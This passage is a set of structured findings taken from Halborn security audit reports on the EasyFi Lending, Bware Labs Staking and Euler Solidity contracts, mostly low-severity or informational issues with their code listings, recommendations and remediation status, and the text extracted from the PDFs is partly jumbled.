"html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Contracts should be deployed with the same compiler version and flags used during development and testing. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma. For example, an outdated pragma version might introduce bugs that affect the contract system negatively or recently released pragma versions may have unknown security vulnerabilities. Listing 3 1 pragma solidity ^0.5.16; Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider locking the pragma version as it is not recommended to use a floating pragma in production. Apart from just locking the pragma version in the code, the sign (>=) needs to be removed. It is possible to lock the pragma by fixing the version both in truffle-config.js for the Truffle framework or in hardhat.config.js for the HardHat framework. Remediation Plan: SOLVED : EasyFi team amended all smart contracts to lock the pragma version. 17 ", "labels": ["Halborn", "EasyFi_Lending", "Severity: Low"]}, {"title": "USAGE OF ASSERT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The assert function should only be used to test for internal errors, and to check invariants according to https://solidity.readthedocs.io/en/latest/control- structures.html#id4. Code Location: SimplePriceOracle.sol Lines# 44-188 Listing 4: SimplePriceOracle.sol 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 function getUnderlyingPrice ( CToken cToken ) public view returns ( uint256 ) { // if (! isStockAsset [ _asset ]) { if ( compareStrings ( cToken . symbol () , \" cETH \")) { address _aggregator = aggregator [ bnbUnderlying ]; ( MathError error , uint256 price ) = mulUInt ( uint256 ( AccessControlledAggregator ( _aggregator ). latestAnswer () ) , 10**10 ); assert ( error == MathError . NO_ERROR ); return price ; } else { address _aggregator = aggregator [ address ( CErc20 ( address ( cToken )) . underlying () ) ]; uint8 underlyingDecimals = EIP20Interface ( address ( CErc20 ( address ( cToken )) . underlying () ) ). decimals () ; if ( underlyingDecimals == 18) { ( MathError error , uint256 price ) = mulUInt ( uint256 ( AccessControlledAggregator ( _aggregator ). latestAnswer () ) , 18 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 10**10 ); assert ( error == MathError . NO_ERROR ); return price ; } if ( underlyingDecimals == 6) { ( MathError error , uint256 price ) = mulUInt ( uint256 ( AccessControlledAggregator ( _aggregator ). latestAnswer () ) , 10**22 ); assert ( error == MathError . NO_ERROR ); return price ; } if ( underlyingDecimals == 8) { ( MathError error , uint256 price ) = mulUInt ( uint256 ( AccessControlledAggregator ( _aggregator ). latestAnswer () ) , 10**20 ); assert ( error == MathError . NO_ERROR ); return price ; } } } Risk Level: Likelihood - 1 Impact - 1 Recommendation: The usage of assert should be reviewed and if it is inappropriate, the exception should be changed with revert. It is recommended to use require() function instead of assert() function. This change will improve 19 code readability. The example code snippet can be seen below. Listing 5: SimplePriceOracle.sol 64 65 66 67 68 69 70 71 72 73 function getUnderlyingPrice ( CToken cToken ) public view returns ( uint256 ) { // if (! isStockAsset [ _asset ]) { if ( compareStrings ( cToken . symbol () , \" cETH \")) { address _aggregator = aggregator [ bnbUnderlying ]; ( MathError error , uint256 price ) = mulUInt ( uint256 ( AccessControlledAggregator ( _aggregator ). latestAnswer () ) , 10**10 ); require ( error == MathError . NO_ERROR , \" Error with calculation \" ); return price ; Remediation Plan: SOLVED : assert was replaced with require within the SimplePriceOracle.sol smart contract. 20 ", "labels": ["Halborn", "EasyFi_Lending", "Severity: Informational"]}, {"title": "LACK OF DUPLICATE AGGREGATOR CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "During the manual code review, it has been observed that the duplicate aggregators have not been checked on the constructor. Although the function is authorized by a contract deployer, the duplicate aggregator should be checked on the related function. Code Location: SimplePriceOracle.sol Lines# 17 Listing 6 1 2 3 4 5 6 7 8 constructor ( address [] memory _assets , address [] memory _aggregators ) public { } admin = msg . sender ; for ( uint256 i = 0; i < _assets . length ; i ++) { aggregator [ _assets [ i ]] = _aggregators [i ]; } Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider to eliminate duplicate variables on the aggregators array. 21 Remediation Plan: ACKNOWLEDGED: EasyFi team informed that the data will be passed by admin at time of deployment, where duplication will be taken care. 22 ", "labels": ["Halborn", "EasyFi_Lending", "Severity: Informational"]}, {"title": "LACK OF ZERO ADDRESS CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Some addresses used in constructors and functions are not being validated. Every address should be validated and checked that is different than zero. Aggregators and assets should not be equal to zero. Code Location: SimplePriceOracle.sol Lines# 17 Listing 7 1 2 3 4 5 6 7 8 constructor ( address [] memory _assets , address [] memory _aggregators ) public { } admin = msg . sender ; for ( uint256 i = 0; i < _assets . length ; i ++) { aggregator [ _assets [ i ]] = _aggregators [i ]; } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to validate that every address input is different than zero. 23 Remediation Plan: ACKNOWLEDGED: EasyFi team informed that the data will be passed by admin at time of deployment, where zero address check will be taken care. 24 ", "labels": ["Halborn", "EasyFi_Lending", "Severity: Informational"]}, {"title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In public functions, array arguments are immediately copied to mem- ory, while external functions can read directly from calldata. Reading Public functions need to calldata is cheaper than memory allocation. write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. The public function uses 496 gas, while the external function uses only 261. Also, methods do not necessarily have to be public if they are only called within the contract - in such case they should be marked internal. Code Location: Below are smart contract and Its corresponding functions affected: SimplePriceOracle.sol: addAsset, addStockAsset, getUnderlyingPrice, getUnderlyingPrice1 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider as much as possible declaring external variables instead of public variables. As for best practice, you should use external if you expect that the function will only be called externally and use public if you need to call the function internally. To sum up, everyone can access public functions, external functions can only be accessed externally and 25 internal functions can only be called within the contract. Remediation Plan: SOLVED : EasyFi team replaced public with external in the recommended functions. 26 ", "labels": ["Halborn", "EasyFi_Lending", "Severity: Informational"]}, {"title": "MISSING EVENTS EMISSION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It has been observed that important functionality is missing emitting event for some functions on the SimplePriceOracle.sol contract. These Events are a method of informing the functions should emit events. transaction initiator about the actions taken by the called function. An events logs its emitted parameters in a specific log history, which can be accessed outside of the contract using some filter parameters. Code Location: SimplePriceOracle.sol Lines# 34-39 Listing 8: SimplePriceOracle.sol (Lines 34,39) 34 35 36 37 38 39 40 41 42 function addAsset ( address _asset , address _aggregator ) public onlyAdmin { require ( aggregator [ _asset ] == address (0) , \" Already added \" ) ; aggregator [ _asset ] = _aggregator ; } function addStockAsset ( address _asset , uint256 _price ) public onlyAdmin { isStockAsset [ _asset ] = true ; assetPrice [ _asset ] = _price ; } Risk Level: Likelihood - 1 Impact - 2 27 Recommendations: For best security practices, consider declaring events as often as pos- sible at the end of a function. Events can be used to detect the end of the operation. Remediation Plan: SOLVED : EasyFi team implemented Event emission where recommended. 28 ", "labels": ["Halborn", "EasyFi_Lending", "Severity: Informational"]}, {"title": "EXPERIMENTAL FEATURES ENABLED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The use of experimental features could be dangerous on live deployments. The experimental ABI encoder does not handle non-integer values shorter than 32 bytes properly. This applies to bytesNN types, bool, enum and other types when they are part of an array or a struct and encoded directly from storage. This means these storage references have to be used directly inside abi.encode(...) as arguments in external function calls or in event data without prior assignment to a local variable. Using return does not trigger the bug. The types bytesNN and bool will result in corrupted data while enum might lead to an invalid revert. Furthermore, arrays with elements shorter than 32 bytes may not be handled correctly even if the base type is an integer. Encoding such arrays in the way described above can lead to other data in the encoding being overwritten if the number of elements encoded is not a multiple of the number of elements that fit a single slot. If nothing follows the array in the encoding (note that dynamically-sized arrays are always encoded after statically-sized arrays with statically-sized content), or if only a single array is encoded, no other data is overwritten. There are known bugs that are publicly released while using this feature. However, the bug only manifests itself when all the following conditions are met: 1. Storage data involving arrays or structs is sent directly to an external function call, to abi.encode or to event data without prior assignment to a local (memory) variable. 2. There is an array that contains elements with size less than 32 bytes or a struct that has elements that share a storage slot or members of type bytesNN shorter than 32 bytes. In addition to that, in the following situations, the code is NOT affected: 1. If all the structs or arrays only use uint256 or int256 types. 29 2. If you only use integer types (that may be shorter) and only encode at most one array at a time. 3. If you only return such data and do not use it in abi.encode, external calls or event data. ABIEncoderV2 is enabled to allow to pass the struct type into a function in both web3 and another contract. Naturally, any bug can have wildly varying consequences depending on the program control flow, but it is expected expected that this is more likely to lead to malfunction than exploitability. The bug, when triggered, will under certain circumstances send corrupt parameters on method invocations to other contracts. Reference: https://blog.ethereum.org/2019/03/26/solidity-optimizer-and-abiencoderv2-bug/ Code Location: Listing 9 1 pragma experimental ABIEncoderV2 ; Risk Level: Likelihood - 1 Impact - 2 Recommendation: When possible, do not use experimental features in the final live de- ployment. Validate and check that all the conditions above are true for integers and arrays (i.e. all using uint256). 30 Remediation Plan: ACKNOWLEDGED: EasiFy team limited the use of experimental features to only the necessary items. 31 ", "labels": ["Halborn", "EasyFi_Lending", "Severity: Informational"]}, {"title": "UNUSED CODE SECTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/EasyFi_Lending_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "the smart contract the In getUnderlyingPrice1 function is the same as the getUnderlyingPrice Therefore, the stated code base should be deleted from the function. repository. Additionally, a large commented block of code was found. SimplePriceOracle.sol, code the of Code Location: SimplePriceOracle.sol Lines# 94-142 Listing 10 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 function getUnderlyingPrice1 ( CToken cToken ) public view returns ( uint256 , address ) { if ( compareStrings ( cToken . symbol () , \" cETH \")) { address _aggregator = aggregator [ bnbUnderlying ]; ( MathError error , uint256 price ) = mulUInt ( uint256 ( AccessControlledAggregator ( _aggregator ). latestAnswer () ) , 10**10 ); assert ( error == MathError . NO_ERROR ); return ( price , _aggregator ); } else { address _aggregator = aggregator [ address ( CErc20 ( address ( cToken )) . underlying () ) ]; uint8 underlyingDecimals = EIP20Interface ( address ( CErc20 ( address ( cToken )) . underlying () ) ). decimals () ; return ( underlyingDecimals , _aggregator ); // if ( underlyingDecimals == 18) { // // // uint256 ( ( MathError error , uint256 price ) = mulUInt ( AccessControlledAggregator ( _aggregator ) . latestAnswer () 32 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 ( MathError error , uint256 price ) = mulUInt ( AccessControlledAggregator ( _aggregator ) ) ; assert ( error == MathError . NO_ERROR ) ; return price ; ) , 10**10 // // // // // // } // if ( underlyingDecimals == 6) { // // // uint256 ( . latestAnswer () ) ; assert ( error == MathError . NO_ERROR ) ; return price ; ) , 10**22 // // // // // // } // if ( underlyingDecimals == 8) { // // // uint256 ( ( MathError error , uint256 price ) = mulUInt ( AccessControlledAggregator ( _aggregator ) . latestAnswer () ) , 10**20 ) ; assert ( error == MathError . NO_ERROR ) ; return price ; // // // // // // } } } Risk Level: Likelihood - 1 Impact - 1 Recommendation: As stated on the description, getUnderlyingPrice1 should be deleted from the contract. This will reduce gas cost and code complexity. 33 Remediation Plan: SOLVED: EasyFi team amended the code base to remove duplicates and re- dundant code. 34 3.10 (HAL-10) USAGE OF ABI ENCODEPACKED FUNCTION - INFORMATIONAL ", "labels": ["Halborn", "EasyFi_Lending", "Severity: Informational"]}, {"title": "UNUSABLE STAKING POOL AFTER POOL OWNER UNSTAKE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bware_Labs_Staking_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf.pdf", "body": "A staking pool cannot be reused once the pool owner unstakes their tokens from the pool. That means, if a poolOwner removes all their stake from the node operator and the pool is set to TERMINATED, if the pool owner wants to stake again in the same pool with the same address, nodeIndex and chainId, they cannot do it. Code Location: Code Section - DelegationsAdapter.sol#L128 Listing 1: DelegationsAdapter.sol (Line 128) 126 function _stake ( bytes32 poolId , address delegator , Currency []  memory currencies ) internal { 127 128 129 130 131 validateCurrencies ( currencies ); require ( poolOperative ( poolId ) , \" E104 \" ); // regular delegators can only stake main token require ( ( currencies . length == 1 && currencies [0]. erc20 ==  rewardsToken () ) || isPoolOwner ( delegator , poolId ) , 132 133 134 135 136 137 138 \" E105 \" ); _updateDelegation ( poolId , delegator , currencies , true ); assert ( poolOperative ( poolId )); } 19 Code Section - StakingStorage.sol#L116 Listing 2: StakingStorage.sol (Line 116) 114 function poolOperative ( bytes32 poolId ) public view returns (  bool ) { 115 116 Pool storage poolPtr = _poolsArchive [ poolId ]; return poolExists ( poolId ) && poolPtr . delegations [ poolPtr .  meta . owner ]. deposited . nextEpochBalance != 0; 117 } Proof Of Concept: Listing 3: HalbornTest.t.sol bytes32 poolId = _setUpSimpleEnv ( MIN_POOL_OWNER_STAKE , _basicNextEpoch ( times , poolId ); _delegate ( alice , poolId , 10 ether , address ( aToken )) ; vm . startPrank ( alice ); stakingContract . undelegate ( poolId , currencies ); vm . stopPrank () ; // HAL01 function test_IT_01_poolOwner_01 () public { uint256 times = 5; _basicNextEpoch ( times , poolId ); 1 2 3  alice ); 4 5 6 7 8 9 10 11 12 13 14 15 16 17  poolOwner ) internal returns ( bytes32 poolId ){ 18 19 20 21 22 23 24 25 26 vm . startPrank ( owner ); aToken . transfer ( poolOwner , poolOwnerStake ); vm . stopPrank () ; } // HELPER FUNCTIONS function _setUpSimpleEnv ( uint256 poolOwnerStake , address aCurrency . erc20 = IERC20Upgradeable ( address ( aToken )) ; aCurrency . amount = MIN_POOL_OWNER_STAKE ; vm . startPrank ( poolOwner ); aToken . approve ( address ( stakingContract ) , poolOwnerStake ); 20 poolId = bytes32 ( abi . encodePacked ( poolOwner , uint64 (0) , } vm . stopPrank () ; function _basicNextEpoch ( uint256 times , bytes32 poolId ) vm . startPrank ( owner ); bwr . approve ( address ( stakingContract ) , 100000 ether ); stakingContract . depositRewards (100000 ether ); vm . warp ( block . timestamp + 1 days ); poolIds . push ( poolId ); performances . push (1000) ; ownersBaseApy . push (0) ; vm . stopPrank () ; currencies . push ( aCurrency ); 27 28 29 stakingContract . createNewPool (0 , 0 , uint16 (  MIN_POOL_COMMISSION_FEE ) , currencies ); // currencies 30 31  uint32 (0) )); 32 33 34 35  internal { 36 37 38 39 40 41 42 43 44 45 46 47 48  ownersBaseApy ); 49 50 51 52 53 54 55 56 57 58  amount , address token ) internal { 59 60 61 62 63 64 } vm . stopPrank () ; poolIds . pop () ; performances . pop () ; ownersBaseApy . pop () ; vm . warp ( block . timestamp + 1 days ); stakingContract . endEpoch () ; vm . startPrank ( finalizer ); for ( uint256 i ; i < times ; ++ i){ currencies . pop () ; vm . startPrank ( owner ); IERC20Upgradeable ( token ). transfer ( user , amount ); vm . stopPrank () ; function _delegate ( address user , bytes32 poolId , uint256 vm . startPrank ( user ); } vm . warp ( block . timestamp + 1 days ); stakingContract . finalizePools ( poolIds , performances , 21 IERC20Upgradeable ( token ). approve ( address ( stakingContract ) , 65  amount ); 66 67 68 69 70 71 72 73 74 } bCurrency . erc20 = IERC20Upgradeable ( token ); bCurrency . amount = amount ; currencies . push ( bCurrency ); stakingContract . delegate ( poolId , currencies ); vm . stopPrank () ; BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:M/D:N/Y:N/R:P/S:U (2.5) Recommendation: It is recommended to consider allowing the poolOwner to change the state of the pool from TERMINATED to OPERATIVE on the restake operation. Remediation Plan: NOT APPLICABLE: The Bware Labs stated this is a design choice. Whether the poolOwner removes all their stake from the node operator, the pool is set to TERMINATED state, which is a desired behavior. 22 ", "labels": ["Halborn", "Bware_Labs_Staking_Protocol", "Severity: Low"]}, {"title": "NOT ALL ROLES ARE SET UP ON INITIALIZATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bware_Labs_Staking_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf.pdf", "body": "In the Staking.sol contract, the initialize() function does not call the setupRole() functions for all available roles when initializing the contract. The PAUSER_ROLE, JAILER_ROLE, FINALIZER_ROLE roles need to be set with the _setupRole() function manually by the account assigned the OWNER_ROLE. Code Location: Code Section - Staking.sol#L81 Listing 4: Staking.sol (Lines 89-92) address protocolOwner , IERC20Upgradeable rewardsToken_ , uint256 minEpochDuration ) public initializer { __StakingEpochManager_init_unchained ( minEpochDuration ); 81 function initialize ( 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 } _setupRole ( OWNER_ROLE , protocolOwner ); _setRoleAdmin ( OWNER_ROLE , OWNER_ROLE ); _setRoleAdmin ( PAUSER_ROLE , OWNER_ROLE ); _setRoleAdmin ( JAILER_ROLE , OWNER_ROLE ); _setRoleAdmin ( FINALIZER_ROLE , OWNER_ROLE ); _initializeRewardsToken ( rewardsToken_ ); // pause protocol until entirely configured _pause () ; 23 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:M/D:N/Y:N/R:P/S:U (2.5) Recommendation: Set up all available roles in the contract on initialization. Remediation Plan: RISK ACCEPTED: The Bware Labs team plans to set roles manually by the multi-signature account, that has OWNER_ROLE role, after the deployment. 24 ", "labels": ["Halborn", "Bware_Labs_Staking_Protocol", "Severity: Low"]}, {"title": "USE CUSTOM ERRORS TO SAVE GAS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bware_Labs_Staking_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf.pdf", "body": "Custom errors are available from Solidity version 0.8.4. Custom errors save ~50 gas each time they are hit by avoiding having to allocate and store the revert string. Not defining strings also saves deployment gas. Code Location: In the following contracts, the errors can be customized:  Staking.sol  DelegationsAdapter.sol  TransfersAdapter.sol  StakingEpochManager.sol  Finalizer.sol BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:P/S:U (0.0) Recommendation: Consider replacing all revert strings with custom errors. Remediation Plan: ACKNOWLEDGED: The Bware Labs acknowledged this finding. 25 ", "labels": ["Halborn", "Bware_Labs_Staking_Protocol", "Severity: Informational"]}, {"title": "INEFFICIENT CONDITION IN THE FINALIZEPOOL INTERNAL FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bware_Labs_Staking_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf.pdf", "body": "When a pool is jailed, as the baseReward and the poolReward is equal to zero after the code in line 179 executes, the arithmetic operations performed in lines 181 and 182 can be skipped and the poolReward and baseReward variables can be immediately set to 0. Code Location: Code Section - Finalizer.sol#175 Listing 5: Finalizer.sol (Lines 175,176) 170 171 172 173 174 175 if ( poolPtr . meta . jailed ) { poolReward = 0; baseReward = 0; } // apply slashing on all reward types poolReward = ( poolReward * performance ) /  PERCENTAGE_SCALING_FACTOR ; 176 baseReward = ( baseReward * performance ) /  PERCENTAGE_SCALING_FACTOR ; BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:P/S:U (0.0) 26 Proof of Concept: As you can see in the following images, the function _finalizePool costs 300 gas units less by using the else condition as mentioned below. Recommendation: Consider adding an else condition after the if statement that encapsulates these lines. Listing 6: Finalizer.sol (Line 175) 170 171 172 173 174 175 176 if ( poolPtr . meta . jailed ) { poolReward = 0; baseReward = 0; } // apply slashing on all reward types else { poolReward = ( poolReward * performance ) /  PERCENTAGE_SCALING_FACTOR ; 177 baseReward = ( baseReward * performance ) /  PERCENTAGE_SCALING_FACTOR ; 178 } Remediation Plan: ACKNOWLEDGED: The Bware Labs acknowledged this finding. 27 RECOMMENDATIONS OVERVIEW 28 1. It is recommended that the poolOwner can still change the state of the pool from TERMINATED to OPERATIVE if he stakes again. 2. Set all the needed roles within the contract during initialization. 3. Consider replacing all revert strings with custom errors. 4. Consider adding an else condition after the if statement that en- capsulates these lines. W E I V R E V O S N O I T A D N E M M O C E R 29 RE-TEST 30 The issue described in this section was brought to Halborns attention by the Bware Labs team during the engagement. 6.1 BWARE01 - THERE IS NO CAP FOR THE POOL OWNERS STAKE ", "labels": ["Halborn", "Bware_Labs_Staking_Protocol", "Severity: Informational"]}, {"title": "FLOATING PRAGMA", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Euler_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf", "body": "Some of the contracts use a floating pragma, such as ^0.8.0. Deploy contracts with the same compiler version and flags used during devel- opment and testing. Locking the pragma helps ensure that contracts do not accidentally get deployed using a different compiler specification. For example, an outdated compiler version might introduce bugs, or a new version that is not extensively tested may introduce security vulnera- bilities. Code Location: Listing 1: BaseLogic.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 2: BaseIRM.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 3: Constants.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 4: Interfaces.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; 14 Listing 5: Euler.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 6: Proxy.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 7: Storage.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 8: BaseModule.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 9: Events.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 10: Base.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; 15 Listing 11: views/EulerGeneralView.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 12: vendor/TickMath.sol (Lines 9) 5 // Updated to Solidity 0.8 by Euler : 6 // 7 // * Cast MAX_TICK to int256 before casting to uint * Wrapped function bodies with \" unchecked {}\" so as to not add any extra gas costs 8 9 pragma solidity ^0.8.0; Listing 13: modules/Exec.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 14: modules/Installer.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 15: modules/Markets.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 16: modules/EToken.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; 16 Listing 17: modules/RiskManager.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 18: modules/DToken.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 19: modules/Governance.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 20: modules/Liquidation.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 21: modules/interest-rate-models/IRMLinearRecursive.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 22: modules/interest-rate-models/IRMZero.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; 17 Listing 23: modules/interest-rate-models/IRMLinear.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 24: modules/interest-rate-models/IRMFixed.sol (Lines 3) 1 // SPDX - License - Identifier : UNLICENSED 2 3 pragma solidity ^0.8.0; Listing 25: modules/interest-rate-models/IRMDefault.sol (Lines 1) 1 pragma solidity ^0.8.0; Risk Level: Likelihood - 1 Impact - 3 Recommendations: Lock the pragma version whenever possible and avoid using a floating pragma in the final deployment. The pragma can be locked in the code by removing the caret () and by specifying the exact version in the Truffle configuration file truffle-config.js or hardhat.config.js if using the HardHat framework. Remediation Plan: RISK ACCEPTED: Euler team accepted this risk. During development its easier to upgrade the compiler if its floating, and post-deployment it obviously cant be changed anyway, so they will fixate the compiler version when deploying. 18 ", "labels": ["Halborn", "Euler", "Severity: Low"]}, {"title": "USE OF BLOCK.TIMESTAMP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Euler_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf", "body": "During a manual static review, the tester noticed the use of block. timestamp in BaseLogic, RiskManager, Markets and Liquidation contract. The global variable block.timestamp does not necessarily hold the current time, and may not be accurate. Miners can influence the value of block .timestamp to perform Maximal Extractable Value (MEV) attacks. There is no guarantee that the value is correct, only that it is higher than the previous blocks timestamp. Code Location: Listing 26: Liquidation.sol (Lines 191) 189 190 191 192 if ( bonus > 1 e18 ) bonus = 1 e18 ; bonus = bonus * ( block . timestamp - lastActivity ) / BONUS_REFRESH_PERIOD ; if ( bonus > 1 e18 ) bonus = 1 e18 ; Listing 27: BaseLogic.sol (Lines 27) 25 26 27 function updateLastActivity ( address account ) internal { uint lastActivity = accountLookup [ account ]. lastActivity ; if ( lastActivity != 0 && lastActivity != block . timestamp ) accountLookup [ account ]. lastActivity = uint40 ( block . timestamp ); 28 } Listing 28: BaseLogic.sol (Lines 163,166) 161 162 163 // Update interest accumulator and reserves if ( block . timestamp != assetCache . lastInterestAccumulatorUpdate ) { 19 164 165 166 167 168 dirty = true ; uint deltaT = block . timestamp - assetCache . lastInterestAccumulatorUpdate ; // Compute new values Listing 29: BaseLogic.sol (Lines 193) 191 192 193 194 195 assetCache . totalBorrows = encodeDebtAmount ( newTotalBorrows ); assetCache . interestAccumulator = newInterestAccumulator ; assetCache . lastInterestAccumulatorUpdate = uint40 ( block . timestamp ); if ( newTotalBalances != assetCache . totalBalances ) { Listing 30: RiskManager.sol (Lines 146) 144 145 146 147 148 // Call observe () again to get the oldest available ago = block . timestamp - oldestAvailableAge ; secondsAgos [0] = uint32 ( ago ); Listing 31: Markets.sol (Lines 57) 55 56 57 58 59 assetStorage . dTokenAddress = childDToken ; assetStorage . lastInterestAccumulatorUpdate = uint40 ( block . timestamp ); assetStorage . underlyingDecimals = decimals ; assetStorage . interestRateModel = uint32 ( MODULEID__IRM_DEFAULT ) ; Listing 32: Markets.sol (Lines 162) 160 161 162 163 } address msgSender = unpackTrailingParamMsgSender () ; address account = getSubAccount ( msgSender , subAccountId ); accountLookup [ account ]. lastActivity = uint40 ( block . timestamp ); 20 Risk Level: Likelihood - 1 Impact - 4 Recommendation: Use block.number instead of block.timestamp to reduce the risk of MEV attacks. If possible, use an oracle. Remediation Plan: For instance see RISK ACCEPTED: This is part of our systems design. the Compounding Behaviour in the arch doc. I dont believe miners can extract any value by manipulating the timestamp within the networks allowable range. 21 ", "labels": ["Halborn", "Euler", "Severity: Low"]}, {"title": "NO STORAGE REFUND WHEN EXITING THE MARKET", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Euler_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf", "body": "During a manual static review, the tester noticed that the doExitMarket function on BaseLogic does not zero out the storage when numMarketsEntered is set to 1. For the showcase, the code shown in Listing ?? was written. The ?? shows that the value was not zeroed out when exiting the last market. Listing 33: Code used to showcase memory not zeroed out 1 function halborn_market ( uint subAccountId , uint256 index ) external returns ( address ){ return halborn_marketbase ( subAccountId , index ); 2 3 } 4 5 function halborn_marketbase ( uint subAccountId , uint256 index ) public returns ( address ){ address msgSender = unpackTrailingParamMsgSender () ; address account = getSubAccount ( msgSender , subAccountId ); address [ MAX_POSSIBLE_ENTERED_MARKETS ] storage markets = marketsEntered [ account ]; return _getEnteredMarketIndex ( account , markets , index ); 6 7 8 9 10 } 22 Code Location: Listing 34: BaseLogic.sol (Lines 90,94) 76 function doExitMarket ( address account , address underlying ) internal { uint32 numMarketsEntered = accountLookup [ account ]. numMarketsEntered ; address [ MAX_POSSIBLE_ENTERED_MARKETS ] storage markets = marketsEntered [ account ]; uint searchIndex = type ( uint ). max ; for ( uint i = 0; i < numMarketsEntered ; i ++) { if ( _getEnteredMarketIndex ( account , markets , i ) == underlying ) { searchIndex = i; break ; } } if ( searchIndex == type ( uint ). max ) return ; // already exited uint lastMarketIndex = numMarketsEntered - 1; if ( searchIndex != lastMarketIndex ) _setEnteredMarketIndex ( 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 23 account , markets , searchIndex , _getEnteredMarketIndex ( account , markets , lastMarketIndex )) ; accountLookup [ account ]. numMarketsEntered - -; if ( lastMarketIndex != 0) _setEnteredMarketIndex ( account , markets , lastMarketIndex , address (0) ) ; // zero out for storage refund 92 93 94 95 } 